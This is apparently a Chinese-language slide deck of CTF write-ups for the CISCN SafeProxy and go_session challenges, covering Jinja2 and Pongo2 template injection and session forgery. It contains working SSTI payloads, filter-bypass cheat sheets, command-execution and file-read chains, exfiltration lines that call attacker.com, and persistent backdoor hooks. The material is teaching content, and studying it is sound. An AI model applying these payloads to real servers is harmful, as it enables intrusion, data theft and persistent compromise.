---
layout: center
transition: fade-out
---

<!-- markdownlint-disable single-title no-inline-html heading-style blanks-around-headings no-duplicate-heading heading-increment-->

# CISCN 2025 SafeProxy

Tags: <Tag color="green">Jinja SSTI</Tag> <Tag color="blue">LFI</Tag> <Tag color="purple">Python</Tag>

<style>
h1 {
  background-color: #2B90B6;
  background-image: linear-gradient(45deg, #4EC5D4 10%, #146b8c 20%);
  background-size: 100%;
  -webkit-background-clip: text;
  -moz-background-clip: text;
  -webkit-text-fill-color: transparent;
  -moz-text-fill-color: transparent;
}
</style>

---

## 题目源码

```python {all|9-12|13-23|43-52|54-66|94-106|all}{lines:true, maxHeight:'90%'}
from flask import Flask, request, render_template_string
import socket
import threading
import html

app = Flask(__name__)

@app.route('/', methods=["GET"])
def source():
    with open(__file__, 'r', encoding='utf-8') as f:
        return '<pre>'+html.escape(f.read())+'</pre>'

@app.route('/', methods=["POST"])
def template():
    template_code = request.form.get("code")
    # 安全过滤
    blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\r', '\n']
    for black in blacklist:
        if black in template_code:
            return "Forbidden content detected!"
    result = render_template_string(template_code)
    print(result)
    return 'ok' if result is not None else 'error'

class HTTPProxyHandler:
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port

    def handle_request(self, client_socket):
        try:
            request_data = b""
            while True:
                chunk = client_socket.recv(4096)
                request_data += chunk
                if len(chunk) < 4096:
                    break

            if not request_data:
                client_socket.close()
                return

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy_socket:
                proxy_socket.connect((self.target_host, self.target_port))
                proxy_socket.sendall(request_data)

                response_data = b""
                while True:
                    chunk = proxy_socket.recv(4096)
                    if not chunk:
                        break
                    response_data += chunk

            header_end = response_data.rfind(b"\r\n\r\n")
            if header_end != -1:
                body = response_data[header_end + 4:]
            else:
                body = response_data
                
            response_body = body
            response = b"HTTP/1.1 200 OK\r\n" \
                       b"Content-Length: " + str(len(response_body)).encode() + b"\r\n" \
                       b"Content-Type: text/html; charset=utf-8\r\n" \
                       b"\r\n" + response_body

            client_socket.sendall(response)
        except Exception as e:
            print(f"Proxy Error: {e}")
        finally:
            client_socket.close()

def start_proxy_server(host, port, target_host, target_port):
    proxy_handler = HTTPProxyHandler(target_host, target_port)
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(100)
    print(f"Proxy server is running on {host}:{port} and forwarding to {target_host}:{target_port}...")

    try:
        while True:
            client_socket, addr = server_socket.accept()
            print(f"Connection from {addr}")
            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))
            thread.daemon = True
            thread.start()
    except KeyboardInterrupt:
        print("Shutting down proxy server...")
    finally:
        server_socket.close()

def run_flask_app():
    app.run(debug=False, host='127.0.0.1', port=5000)

if __name__ == "__main__":
    proxy_host = "0.0.0.0"
    proxy_port = 5001
    target_host = "127.0.0.1"
    target_port = 5000

    # 安全反代，防止针对响应头的攻击
    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))
    proxy_thread.daemon = True
    proxy_thread.start()

    print("Starting Flask app...")
    run_flask_app()
```

---

## 当用户输入成为代码：什么是服务器端模板注入？

SSTI 发生在用户输入被直接嵌入模板字符串中执行，而不是作为安全的数据上下文传递。

<div class="grid grid-cols-2 gap-4 my-4">
<div class="bg-red-50 dark:bg-red-900/10 border border-red-200 dark:border-red-800 p-4 rounded-lg">
<div class="flex items-center gap-2 text-red-600 dark:text-red-400 font-bold mb-2">
<div class="i-carbon-warning-filled" /> VULNERABLE
</div>
<div class="text-sm">

```python
template = f"Hello {user_input}"
render_template_string(template)
```

</div>
</div>
<div class="bg-green-50 dark:bg-green-900/10 border border-green-200 dark:border-green-800 p-4 rounded-lg">
<div class="flex items-center gap-2 text-green-600 dark:text-green-400 font-bold mb-2">
<div class="i-carbon-checkmark-filled" /> SAFE
</div>
<div class="text-sm">

```python
render_template_string("Hello {{ name }}", name=user_input)
```

</div>
</div>
</div>

### 为何 Jinja2 如此强大（且危险）？

Python 强大的 <span class="text-orange-500 font-bold">内省 (introspection)</span> 能力允许我们逃逸 Jinja2 沙箱。

<div class="flex flex-col gap-2 mt-4">
  <div class="flex items-center gap-2">
    <div class="i-carbon-tag text-blue-500" />
    <span><code>__class__</code>: 访问任何对象的类型。</span>
  </div>
  <div class="flex items-center gap-2">
    <div class="i-carbon-link text-blue-500" />
    <span><code>__mro__</code>: 遍历继承链，直至 object 基类。</span>
  </div>
  <div class="flex items-center gap-2">
    <div class="i-carbon-tree-view-alt text-blue-500" />
    <span><code>object.__subclasses__()</code>: 枚举解释器中所有已加载的类。</span>
  </div>
  <div class="flex items-center gap-2">
    <div class="i-carbon-improve-relevance text-red-500" />
    <span>最终目标：在众多子类中寻找危险方法（如文件 I/O、代码执行）。</span>
  </div>
</div>

---

## 经典利用链：通往 RCE 的万能钥匙

<div class="flex flex-col gap-2 mt-4">

```mermaid
graph LR
    A(string) --> B(__class__)
    B --> C(__mro__)
    C --> D(object)
    D --> E("__subclasses__()")
    E --> F(dangerous_class)
    F --> G("exploit()")
    
    classDef blue fill:#164e63,stroke:#0e7490,color:white
    classDef orange fill:#f97316,stroke:#c2410c,stroke-width:4px,color:white,font-weight:bold

    class A,B,C,D,E blue
    class F,G orange
```

</div>

### 初步探测

使用多语言探针 (polyglot probes) 测试表达式求值行为。

| Payload | Expected (if SSTI) | Engine Hint |
| --- | --- | --- |
| `{{7*7}}` | <span class="bg-orange-100 text-orange-600 px-1 rounded">49</span> | Jinja2, Twig |
| `{{7*'7'}}` | <span class="bg-orange-100 text-orange-600 px-1 rounded">7777777</span> | Jinja2 (string multiplication) |
| `{{config}}` | [Config object dump] | Flask/Jinja2 |
| `{{self}}` | [Template object ref] | Jinja2 |

---
layout: two-cols-header
---

## 行动蓝图：过滤器绕过备忘录

::left::

### 常见过滤器绕过方案

| 被拦截 | 解决方案 |
| --- | --- |
| `__` | `"_" + "_"` / `"_" ~ "_"` / `request.args` |
| `.` | `\|attr("x")` / `["key"]` |
| `[]` | `\|attr("__getitem__")(key)` |
| `'` / `"` | `request.args` / `request.cookies` |
| `_` | `"\x5f"` (hex) / `chr(95)` |
| `\|` | bracket notation `["key"]` (no filters) |
| `attr` | `["key"]` / `__getattribute__()` |
| `import` | `"_" ~ "_imp" ~ "ort_" ~ "_"` |
| `os` | `"o" ~ "s"` / subclass gadget |
| `popen` | `"po" ~ "pen"` / `"p\x6fpen"` |

::right::

### 常用字符 Hex 编码

| Symbol | Hex Escape |
| --- | --- |
| `_` | `\x5f` |
| `.` | `\x2e` |
| `[` | `\x5b` |
| `]` | `\x5d` |
| `'` | `\x27` |
| `"` | `\x22` |

---
layout: two-cols-header
---

## 定位并访问 `__builtins__`

::left::

<div class="flex items-center gap-2 my-2">
  <div class="i-carbon-keep-dry text-blue-500" />
  <h3>寻找全局入口点</h3>
</div>
<!-- ### 寻找全局入口点 -->

Flask/Jinja2 默认提供了一些可利用的全局对象。

| Object | Access Path to `__globals__` |
| --- | --- |
| `lipsum` | `lipsum.__globals__` |
| `cycler` | `cycler.__init__.__globals__` |
| `url_for` | `url_for.__globals__` |
| `config` | (Direct access) |
| `request` | (Direct access) |

::right::

<div class="flex items-center gap-2 my-2">
  <div class="i-carbon-arrow-right text-red-400" />
  <h3>从入口点到 <code>__builtins__</code></h3>
</div>

`__builtins__` 包含了所有 Python 内置函数，如 <span class="bg-orange-200 dark:bg-orange-800 px-1 rounded">open</span>, <span class="bg-orange-200 dark:bg-orange-800 px-1 rounded">eval</span>, <span class="bg-orange-200 dark:bg-orange-800 px-1 rounded">\_\_import\_\_</span>。

Payload:

<div class="bg-gray-100 dark:bg-gray-800 p-2 rounded text-sm mb-4">
&lcub;&lcub; lipsum.__globals__["<span class="bg-orange-200 dark:bg-orange-800 px-1 rounded">__builtins__</span>"] &rcub;&rcub;
</div>

Payload (Bypass):

<div class="bg-gray-100 dark:bg-gray-800 p-2 rounded text-sm">
&lcub;&lcub; lipsum|attr("__globals__")|attr("__getitem__")("<span class="bg-orange-200 dark:bg-orange-800 px-1 rounded">__builtins__</span>") &rcub;&rcub;
</div>

---
layout: two-cols-header
---

## 从 `__builtins__` 到任意代码执行

::left::

<div class="flex items-center gap-2 my-4 text-xl font-bold text-red-600 dark:text-red-400">
  <div class="i-carbon-flash-filled" />
  <h3>通过 <code>__builtins__</code> 直接执行</h3>
</div>

<div class="flex flex-col gap-4">
  <div class="border-l-4 border-red-500 pl-4">
    <div class="font-bold mb-1 text-sm">读取敏感文件</div>
    <div class="bg-gray-100 dark:bg-gray-800 p-3 rounded text-sm font-mono break-all border border-gray-200 dark:border-gray-700">
      <div class="text-gray-400 text-xs mb-1">// /etc/passwd</div>
      <div>&lcub;&lcub; lipsum.__globals__["<span class="text-red-600 font-bold">__builtins__</span>"]<span class="text-orange-600 font-bold">["open"]("/etc/passwd").read()</span> &rcub;&rcub;</div>
    </div>
  </div>

  <div class="border-l-4 border-red-500 pl-4">
    <div class="font-bold mb-1 text-sm">通过 <code>os.popen</code> 执行命令</div>
    <div class="bg-gray-100 dark:bg-gray-800 p-3 rounded text-sm font-mono break-all border border-gray-200 dark:border-gray-700">
      <div class="text-gray-400 text-xs mb-1">// RCE</div>
      <div>&lcub;&lcub; lipsum.__globals__["<span class="text-red-600 font-bold">__builtins__</span>"]["__import__"]<span class="text-orange-600 font-bold">("os").popen("id").read()</span> &rcub;&rcub;</div>
    </div>
  </div>

  <div class="border-l-4 border-red-500 pl-4">
    <div class="font-bold mb-1 text-sm">通过 <code>eval</code> 执行代码</div>
    <div class="bg-gray-100 dark:bg-gray-800 p-3 rounded text-sm font-mono break-all border border-gray-200 dark:border-gray-700">
      <div class="text-gray-400 text-xs mb-1">// RCE</div>
      <div>&lcub;&lcub; lipsum.__globals__["<span class="text-red-600 font-bold">__builtins__</span>"]["eval"]("<span class="text-orange-600 font-bold">__import__('os').popen('id').read()</span>") &rcub;&rcub;</div>
    </div>
  </div>
</div>

::right::

<div class="mx-2">
<div class="flex items-center gap-2 my-4 text-xl font-bold text-blue-600 dark:text-blue-400">
  <div class="i-carbon-flow" />
  <h3>通过子类 Gadget 执行</h3>
</div>

<div class="text-sm text-gray-500 mb-4">
  当直接访问 <code>__builtins__</code> 受限时，利用 <code>object.__subclasses__()</code> 寻找可用类。
</div>

<div class="bg-blue-50 dark:bg-blue-900/10 border border-blue-200 dark:border-blue-800 rounded-lg p-4 mb-4">
  <div class="flex items-center gap-2 font-bold text-blue-700 dark:text-blue-300 mb-2">
    <div class="i-carbon-terminal" />
    <span>subprocess.Popen (最常见)</span>
  </div>
  
  <div class="bg-white dark:bg-black/50 p-2 rounded border border-blue-100 dark:border-blue-900/50 font-mono text-xs overflow-x-auto">
    <div class="text-gray-400">// 1. 找到 Popen 类的索引</div>
    <div>{% set popen = "".__class__.__mro__[1].__subclasses__()[<span class="text-orange-500">INDEX</span>] %}</div>
    <div class="text-gray-400 mt-1">// 2. 执行命令并获取输出</div>
    <div>&lcub;&lcub; popen("id", shell=True, stdout=-1).communicate()[0] &rcub;&rcub;</div>
  </div>
</div>

<div class="bg-gray-50 dark:bg-gray-800/50 border border-gray-200 dark:border-gray-700 rounded-lg p-3">
  <div class="text-xs font-bold text-gray-500 uppercase mb-1">Helper Script: Finding the Index</div>
  <div class="font-mono text-xs text-gray-600 dark:text-gray-400">
    # for i, cls in enumerate(object.__subclasses__()):<br/>
    #   if "Popen" in str(cls): print(i, cls)
  </div>
</div>
</div>

---

## 在无回显的场景下提取数据

当模板渲染结果不可见时（例如，只返回 'ok' 或 'error'），我们需要使用旁路信道 (side channels) 提取信息。

<div class="grid grid-cols-3 gap-x-4 gap-y-4 mt-8">

  <!-- Icons -->
  <div class="flex justify-center text-4xl text-blue-500"><div class="i-carbon-time" /></div>
  <div class="flex justify-center text-4xl text-red-500"><div class="i-carbon-warning" /></div>
  <div class="flex justify-center text-4xl text-green-500"><div class="i-carbon-export" /></div>

  <!-- Titles -->
  <div class="text-center font-bold text-lg -mt-2">时间盲注</div>
  <div class="text-center font-bold text-lg -mt-2">报错盲注</div>
  <div class="text-center font-bold text-lg -mt-2">带外数据提取 (OOB)</div>

  <!-- Descriptions -->
  <div class="text-sm text-gray-500 text-center -mt-2">根据条件的真假产生时间延迟。</div>
  <div class="text-sm text-gray-500 text-center -mt-2">根据条件的真假触发服务器错误 (500) 或正常响应 (200)。</div>
  <div class="text-sm text-gray-500 text-center -mt-2">让服务器主动将数据发送到攻击者控制的外部服务器。</div>

  <!-- Code Blocks -->
  <div class="bg-gray-100 dark:bg-gray-800 p-3 rounded text-xs font-mono border border-gray-200 dark:border-gray-700 h-full">
    <div class="mb-1 text-gray-400"># Boolean check delay</div>
    <div class="break-all">
      &lcub;&lcub; ...<br/>
      <span class="bg-orange-100 dark:bg-orange-900 text-orange-600 dark:text-orange-300 rounded px-1">__import__("time").sleep(3)</span><br/>
      <span class="bg-emerald-100 dark:bg-emerald-900 text-emerald-600 dark:text-emerald-300 rounded px-1">if open("/flag").read()[0]=="f"</span><br/>
      else "" &rcub;&rcub;
    </div>
  </div>

  <div class="bg-gray-100 dark:bg-gray-800 p-3 rounded text-xs font-mono border border-gray-200 dark:border-gray-700 h-full">
    <div class="mb-1 text-gray-400"># Trigger Error</div>
    <div class="break-all">
      &lcub;&lcub; ...<br/>
      <span class="bg-orange-100 dark:bg-orange-900 text-orange-600 dark:text-orange-300 rounded px-1">1/0</span><br/>
      <span class="bg-emerald-100 dark:bg-emerald-900 text-emerald-600 dark:text-emerald-300 rounded px-1">if open("/flag").read()[0]=="f"</span><br/>
      else "ok" &rcub;&rcub;
    </div>
  </div>

  <div class="bg-gray-100 dark:bg-gray-800 p-3 rounded text-xs font-mono border border-gray-200 dark:border-gray-700 h-full flex flex-col gap-2">
    <div>
      <div class="font-bold text-gray-500 mb-1">HTTP Callback:</div>
      <div class="break-all">
        &lcub;&lcub; ...<span class="bg-orange-100 dark:bg-orange-900 text-orange-600 dark:text-orange-300 rounded px-1">__import__("urllib.request").urlopen("http://attacker.com/?d="+flag)</span> &rcub;&rcub;
      </div>
    </div>
    <div>
      <div class="font-bold text-gray-500 mb-1">DNS Exfiltration:</div>
      <div class="break-all">
        &lcub;&lcub; ...<span class="bg-orange-100 dark:bg-orange-900 text-orange-600 dark:text-orange-300 rounded px-1">__import__("socket").gethostbyname(flag+".attacker.com")</span> &rcub;&rcub;
      </div>
    </div>
  </div>

</div>

---

## 应用污染与持久化后门

通过修改 Flask 应用运行时的内部对象，我们可以将一次性漏洞转变为持久化访问。

<div class="grid grid-cols-3 gap-x-4 gap-y-4 mt-8">

  <!-- Titles -->
  <div class="text-center font-bold text-lg">替换视图函数</div>
  <div class="text-center font-bold text-lg">注入请求钩子</div>
  <div class="text-center font-bold text-lg"><code>__file__</code> 污染</div>

  <!-- Descriptions -->
  <div class="text-sm text-gray-500 text-center -mt-2">覆盖一个现有的路由处理函数，使其在被访问时执行我们的恶意代码。</div>
  <div class="text-sm text-gray-500 text-center -mt-2">使用 `after_request` 钩子，修改服务器的每一个响应。</div>
  <div class="text-sm text-gray-500 text-center -mt-2">如果应用有显示自身源码的功能 (<code>open(__file__).read()</code>)，我们可以污染 <code>__file__</code> 变量，使其指向任意文件。</div>

  <!-- Graphics/Icons -->
  <div class="flex justify-center items-center h-20 text-blue-500">
    <!-- Simplified Diagram Representation -->
    <div class="relative w-full max-w-[180px] h-16 border border-blue-200 bg-blue-50 rounded p-2 text-xs flex flex-col justify-center items-center">
      <div class="flex items-center gap-1 w-full justify-between px-2">
        <span class="bg-white border px-1 rounded">/endpoint</span>
        <div class="i-carbon-arrow-right" />
        <span class="bg-red-100 border border-red-200 px-1 rounded text-red-600">malicious</span>
      </div>
    </div>
  </div>

  <div class="flex justify-center items-center h-20 text-blue-800">
    <div class="i-carbon-harbor text-6xl" />
  </div>

  <div class="flex justify-center items-center h-20 text-blue-800">
    <div class="i-carbon-document-export text-6xl" />
  </div>

  <!-- Code Blocks -->
  <div class="bg-gray-100 dark:bg-gray-800 p-3 rounded text-xs font-mono border border-gray-200 dark:border-gray-700 h-full">
    <div class="break-all">
      {% set app = url_for.__globals__["current_app"] %}<br/>
      <span class="text-gray-400">// 覆盖 /target_endpoint 的处理逻辑</span><br/>
      &lcub;&lcub; app.view_functions.__setitem__("target_endpoint", <span class="bg-orange-100 dark:bg-orange-900 text-orange-600 dark:text-orange-300 rounded px-1">eval</span>) &rcub;&rcub;
    </div>
  </div>

  <div class="bg-gray-100 dark:bg-gray-800 p-3 rounded text-xs font-mono border border-gray-200 dark:border-gray-700 h-full">
    <div class="text-gray-400 mb-1">// 动态注册钩子函数</div>
    <div class="break-all">
      {% set app = url_for.__globals__["current_app"] %}<br/>
      &lcub;&lcub; exec("app.after_request(<span class="bg-orange-100 dark:bg-orange-900 text-orange-600 dark:text-orange-300 rounded px-1">lambda r: setattr(r,'data',open('/flag').read().encode()) or r</span>)", {"app": app}) &rcub;&rcub;
    </div>
  </div>

  <div class="bg-gray-100 dark:bg-gray-800 p-3 rounded text-xs font-mono border border-gray-200 dark:border-gray-700 h-full flex flex-col justify-center">
    <div class="break-all">
      &lcub;&lcub; url_for|attr('_globals')|attr('__setitem__')('<span class="bg-orange-100 dark:bg-orange-900 text-orange-600 dark:text-orange-300 rounded px-1">__file__</span>', '/flag') &rcub;&rcub;
    </div>
  </div>

</div>

---
layout: two-cols-header
---

::left::

### 常见过滤器绕过方案

<div class="text-sm mx-2">

| 被拦截 | 解决方案 |
| --- | --- |
| `__` | `"_" + "_"` / `"_" ~ "_"` / `request.args` |
| `.` | `\|attr("x")` / `["key"]` |
| `[]` | `\|attr("__getitem__")(key)` |
| `'` / `"` | `request.args` / `request.cookies` |
| `_` | `"\x5f"` (hex) / `chr(95)` |
| `\|` | bracket notation `["key"]` (no filters) |
| `attr` | `["key"]` / `__getattribute__()` |
| `import` | `"_" ~ "_imp" ~ "ort_" ~ "_"` |
| `os` | `"o" ~ "s"` / subclass gadget |
| `popen` | `"po" ~ "pen"` / `"p\x6fpen"` |

</div>

::right::

### 常用字符 Hex 编码

<div class="text-sm mx-2">

| Symbol | Hex Escape |
| --- | --- |
| `_` | `\x5f` |
| `.` | `\x2e` |
| `[` | `\x5b` |
| `]` | `\x5d` |
| `'` | `\x27` |
| `"` | `\x22` |

</div>

<style>
td {
  padding: 0.25rem 0.5rem;
}
</style>

---

## 焚诀：♿

[Marven11/Fenjing](https://github.com/Marven11/Fenjing)

---
layout: center
transition: fade-out
---

<!-- markdownlint-disable single-title no-inline-html heading-style blanks-around-headings no-duplicate-heading heading-increment-->

# CISCN 2023 go_session

Tags: <Tag color="green">Go Pongo2 SSTI</Tag> <Tag color="blue">SSRF</Tag> <Tag color="purple">Flask</Tag>

<style>
h1 {
  background-color: #2B90B6;
  background-image: linear-gradient(45deg, #4EC5D4 10%, #146b8c 20%);
  background-size: 100%;
  -webkit-background-clip: text;
  -moz-background-clip: text;
  -webkit-text-fill-color: transparent;
  -moz-text-fill-color: transparent;
}
</style>

---
layout: two-cols
---

## 应用架构与攻击面分析

首先，我们需要理解目标应用的结构。这是一个由 Go 和 Python 构建的复合型应用，两个服务之间存在内部通信。

<div class="flex items-center justify-center mt-12 gap-2 scale-90 origin-top-left">
    <!-- User -->
    <div class="flex flex-col items-center">
        <div class="i-carbon-user text-4xl mb-2"></div>
        <span class="text-sm">用户</span>
    </div>
    <div class="i-carbon-arrow-right text-xl text-gray-400"></div>
    <!-- Go Gin Box -->
    <div class="border-2 border-dashed border-blue-800 p-4 rounded-lg bg-blue-50/50 dark:bg-blue-900/10 relative">
        <div class="absolute -top-3 left-1/2 -translate-x-1/2 bg-blue-100 dark:bg-blue-800 text-blue-800 dark:text-blue-100 text-xs px-2 font-bold whitespace-nowrap">暴露的攻击面</div>
        <div class="w-36 h-40 bg-white dark:bg-gray-800 border-2 border-blue-600 rounded flex items-center justify-center text-center shadow-lg p-2 text-sm font-bold text-black dark:text-white">
            Go Gin 应用<br>(80端口)
        </div>
    </div>
    <!-- Arrow -->
    <div class="flex flex-col items-center -mx-2 z-10">
        <div class="text-[10px] font-mono bg-yellow-100 dark:bg-yellow-900 px-1 rounded border border-yellow-200 text-yellow-800 dark:text-yellow-200 mb-1">/flask?name=...</div>
        <div class="w-16 h-0.5 bg-blue-600 relative">
             <div class="absolute right-0 top-1/2 -translate-y-1/2 w-0 h-0 border-t-4 border-t-transparent border-b-4 border-b-transparent border-l-6 border-l-blue-600"></div>
        </div>
    </div>
    <!-- Python Flask Box -->
    <div class="border-2 border-dashed border-orange-400 p-4 rounded-lg bg-orange-50/50 dark:bg-orange-900/10 relative">
        <div class="absolute -top-3 left-1/2 -translate-x-1/2 bg-orange-100 dark:bg-orange-800 text-orange-800 dark:text-orange-100 text-xs px-2 font-bold whitespace-nowrap">内部服务</div>
        <div class="w-36 h-40 bg-white dark:bg-gray-800 border-2 border-blue-900 rounded flex flex-col items-center justify-center text-center shadow-lg p-2 text-sm font-bold text-black dark:text-white">
            <div>内部 Python Flask 服务</div>
            <div class="text-xs font-normal mt-2 text-gray-500">(127.0.0.1:5000)</div>
        </div>
    </div>
</div>

::right::

<div class="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 shadow-md rounded-lg p-6 rotate-1 relative mt-10 ml-4 h-[400px]"
     style="background-image: linear-gradient(#e5e7eb 1px, transparent 1px), linear-gradient(90deg, #e5e7eb 1px, transparent 1px); background-size: 20px 20px; background-position: -1px -1px;">
  <div class="font-bold text-lg mb-4 border-b-2 border-gray-300 pb-2 text-black dark:text-white">核心组件与功能点</div>
  
  <div class="font-bold text-blue-600 dark:text-blue-400 mb-2">Go Gin 应用 (前端)</div>
  <ul class="list-disc pl-4 text-sm space-y-1 mb-4 text-gray-700 dark:text-gray-300">
    <li><code class="text-xs bg-gray-100 dark:bg-gray-700 px-1 rounded border border-gray-300 dark:border-gray-600">/admin</code>: 管理员后台，使用 Pongo2 模板引擎渲染。</li>
    <li><code class="text-xs bg-gray-100 dark:bg-gray-700 px-1 rounded border border-gray-300 dark:border-gray-600">/flask</code>: 存在 SSRF，将请求转发至内部 Flask 服务。</li>
    <li><code class="text-xs bg-gray-100 dark:bg-gray-700 px-1 rounded border border-gray-300 dark:border-gray-600">gorilla/sessions</code>: 用于会话管理。</li>
  </ul>

  <div class="font-bold text-green-600 dark:text-green-400 mb-2">Python Flask 应用 (后端)</div>
  <ul class="list-disc pl-4 text-sm space-y-1 text-gray-700 dark:text-gray-300">
    <li>运行在 <code class="text-xs bg-gray-100 dark:bg-gray-700 px-1 rounded border border-gray-300 dark:border-gray-600">127.0.0.1:5000</code>。</li>
    <li>开启了 Debug 模式，文件修改后服务会自动重载。</li>
  </ul>
</div>

---
layout: two-cols-header
---

## 空密钥引发的会话伪造

::left::

### 漏洞源码分析

```go {all|9|12|17-20|all}{lines:true, maxHeight:'80%'}
// route/route.go
package main

import (
  "net/http"
  "os"

  "github.com/gin-gonic/gin"
  "github.com/gorilla/sessions"
)

var store = sessions.NewCookieStore([]byte(os.Getenv("SESSION_KEY")))

func Admin(c *gin.Context) {
    session, err := store.Get(c.Request, "session-name")
    // ...
    if session.Values["name"] != "admin" {
        http.Error(c.Writer, "NO", http.StatusInternalServerError)
        return
    }
    // ...
}
```

::right::

<!-- Right: Attack Principle -->
<div class="ml-4">
  <div class="text-xl font-bold mb-4 text-orange-600 dark:text-orange-400">攻击原理</div>
  
  <div class="space-y-6">
    <!-- Step 1 -->
    <div class="flex gap-4">
        <div class="flex-none mt-1">
             <div class="bg-orange-100 text-orange-600 p-2 rounded-full">
                <div class="i-carbon-password text-2xl"></div>
             </div>
        </div>
        <div>
            <div class="font-bold text-lg">1. 空密钥</div>
            <div class="text-sm text-gray-600 dark:text-gray-300">
                <code>os.Getenv("SESSION_KEY")</code> 在目标环境变量不存在时，返回一个空字符串 <code>""</code>。
            </div>
        </div>
    </div>
    <!-- Step 2 -->
    <div class="flex gap-4">
        <div class="flex-none mt-1">
             <div class="bg-red-100 text-red-600 p-2 rounded-full">
                <div class="i-carbon-security text-2xl"></div>
             </div>
        </div>
        <div>
            <div class="font-bold text-lg">2. 库漏洞</div>
            <div class="text-sm text-gray-600 dark:text-gray-300">
                旧版的 <code>gorilla/sessions</code> 库 (依赖 <code>gorilla/securecookie</code> v1.1.1) 允许使用空密钥来签名和加密 Cookie。
            </div>
        </div>
    </div>
    <!-- Step 3 -->
    <div class="flex gap-4">
        <div class="flex-none mt-1">
             <div class="bg-blue-100 text-blue-600 p-2 rounded-full">
                <div class="i-carbon-user-role text-2xl"></div>
             </div>
        </div>
        <div>
            <div class="font-bold text-lg">3. 伪造身份</div>
            <div class="text-sm text-gray-600 dark:text-gray-300">
                攻击者可以在本地使用相同的空密钥，生成一个包含 <code>{"name": "admin"}</code> 的有效会话 Cookie。
            </div>
        </div>
    </div>
  </div>
</div>

---
layout: default
---

## Pongo2 SSTI 与 XSS WAF

进入 `/admin` 后，我们发现了新的机会——服务器端模板注入 (SSTI)，但它并非畅通无阻。

<div class="mt-4 relative">
    <div class="absolute -top-3 left-4 bg-gray-100 dark:bg-gray-800 px-2 text-xs font-bold text-gray-500 border border-gray-300 dark:border-gray-600 rounded">
        漏洞源码分析
    </div>
    <div class="bg-gray-50 dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-lg pt-6 pb-2 px-4 shadow-inner">

```go {5-6|9}{lines:true}
func Admin(c *gin.Context) {
    // ...
    name := c.DefaultQuery("name", "ssti")
    // highlight-start
    xssWaf := html.EscapeString(name)
    tpl, err := pongo2.FromString("Hello " + xssWaf + "!")
    // highlight-end
    // ...
    out, err := tpl.Execute(pongo2.Context{"c": c})
    // ...
}
```

</div>
</div>

<div class="grid grid-cols-2 gap-8 mt-4">
    <!-- Opportunity -->
    <div class="border-t-4 border-green-500 pt-4">
        <div class="flex items-center gap-2 text-xl font-bold mb-2 text-green-700 dark:text-green-400">
            <div class="i-carbon-checkmark-outline text-2xl"></div>
            机遇 (SSTI)
        </div>
        <div class="text-sm text-gray-700 dark:text-gray-300 leading-relaxed">
            <code>html.EscapeString</code> 函数的设计初衷是防御 XSS。
            它只转义 <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> 等 HTML 实体，但<span class="font-bold text-green-600 dark:text-green-400">不会转义 Pongo2 模板引擎的语法符号 <code>&lcub;&lcub;</code> 和 <code>&rcub;&rcub;</code></span>。这为模板注入留下了空间。
        </div>
    </div>
    <!-- Challenge -->
    <div class="border-t-4 border-red-500 pt-4">
        <div class="flex items-center gap-2 text-xl font-bold mb-2 text-red-700 dark:text-red-400">
            <div class="i-carbon-security text-2xl"></div>
            挑战 (WAF)
        </div>
        <div class="text-sm text-gray-700 dark:text-gray-300 leading-relaxed">
            该函数会转义单引号 <code>'</code> 和双引号 <code>"</code>。这意味着我们<span class="font-bold text-red-600 dark:text-red-400">无法在注入的模板中直接使用字符串字面量</span>，例如 <code>&lcub;&lcub; c.File("/etc/passwd") &rcub;&rcub;</code> 会因为引号被转义而失效。
        </div>
    </div>
</div>

---

## Gadgets from Gin Context

[`gin.Context` 对象](https://pkg.go.dev/github.com/gin-gonic/gin#Context)暴露了大量可以被 SSTI 调用的方法。关键在于找到那些能帮我们实现“无引号”操作的方法。

<div class="border border-gray-300 dark:border-gray-600 rounded-lg overflow-hidden">
    <div class="bg-gray-100 dark:bg-gray-800 px-4 py-2 border-b border-gray-300 dark:border-gray-600 font-bold text-center">
        <code>gin.Context</code> 上的关键可利用方法
    </div>
    <div class="grid grid-cols-2 divide-x divide-gray-300 dark:divide-gray-600">
        <!-- File Operations -->
        <div class="p-2 bg-blue-50/50 dark:bg-blue-900/10">
            <div class="flex items-center gap-2 font-bold text-lg mb-4 text-blue-700 dark:text-blue-300">
                <div class="i-carbon-folder text-xl"></div>
                文件操作
            </div>
            <ul class="space-y-4 text-sm">
                <li>
                    <code class="font-bold">c.SaveUploadedFile(file, dst)</code>
                    <div class="text-gray-600 dark:text-gray-400 text-xs mt-1">写入文件到服务器。这是实现 RCE 的最终目标。</div>
                </li>
                <li>
                    <code class="font-bold">c.FormFile(name)</code>
                    <div class="text-gray-600 dark:text-gray-400 text-xs mt-1">从 <code>multipart/form-data</code> 请求体中获取上传的文件对象。</div>
                </li>
            </ul>
        </div>
        <!-- String Retrieval -->
        <div class="p-2 bg-orange-50/50 dark:bg-orange-900/10">
            <div class="flex items-center gap-2 font-bold text-lg mb-4 text-orange-700 dark:text-orange-300">
                <div class="i-carbon-string-text text-xl"></div>
                字符串获取
            </div>
            <ul class="space-y-2 text-sm">
                <li>
                    <code class="font-bold">c.Request.Header.Get("...")</code>
                    <div class="text-gray-600 dark:text-gray-400 text-xs">从请求头中获取字符串。</div>
                </li>
                <li>
                    <code class="font-bold">c.Query("...")</code>
                    <div class="text-gray-600 dark:text-gray-400 text-xs">从 URL 查询参数中获取字符串。</div>
                </li>
                <li>
                    <code class="font-bold">c.Request.UserAgent()</code>
                    <div class="text-gray-600 dark:text-gray-400 text-xs">获取 User-Agent 请求头字符串。</div>
                </li>
                <li>
                    <code class="font-bold">c.Request.Header.Accept</code> / <code class="font-bold">.Referer</code>
                    <div class="text-gray-600 dark:text-gray-400 text-xs">获取特定请求头的值（注意：这些返回的是字符串切片，需要用索引 <code>[0]</code> 访问）。</div>
                </li>
            </ul>
        </div>
    </div>
</div>

从「我们需要构造一个字符串」转变为「我能从请求的哪个部分借用一个我需要的字符串？」

---

## Flask 源码分析

我们可以通过触发报错或者 SSTI 的文件包含来得到下述内部 Flask 应用的源码：

```python {all|12}{lines:true}
